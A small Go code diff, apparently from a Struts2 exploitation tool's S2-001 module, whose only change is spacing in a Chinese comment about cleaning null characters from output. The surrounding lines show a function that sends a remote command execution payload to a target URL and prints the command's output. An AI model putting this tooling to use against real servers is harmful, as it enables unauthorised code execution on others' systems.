@@ -23,7 +23,7 @@ func GetWebPath(targetUrl string, postData string) {
 }
 func ExecCommand(targeturl string, command string, postData string) {
     respStrings := utils.PostFunc4Struts2(targeturl, postData, "", utils.POC_s001_exec(command))
-    //下面步骤清洗数据，主要是去掉空字符，输出块大小可以在poc中调节
+    // 下面步骤清洗数据，主要是去掉空字符，输出块大小可以在poc中调节
     respStrings = strings.Replace(url.QueryEscape(respStrings), "%00", "", -1)
     execResult := utils.GetBetweenStr(respStrings, "s001execstart", "s001execend")
     fmt.Println(url.QueryUnescape(execResult))
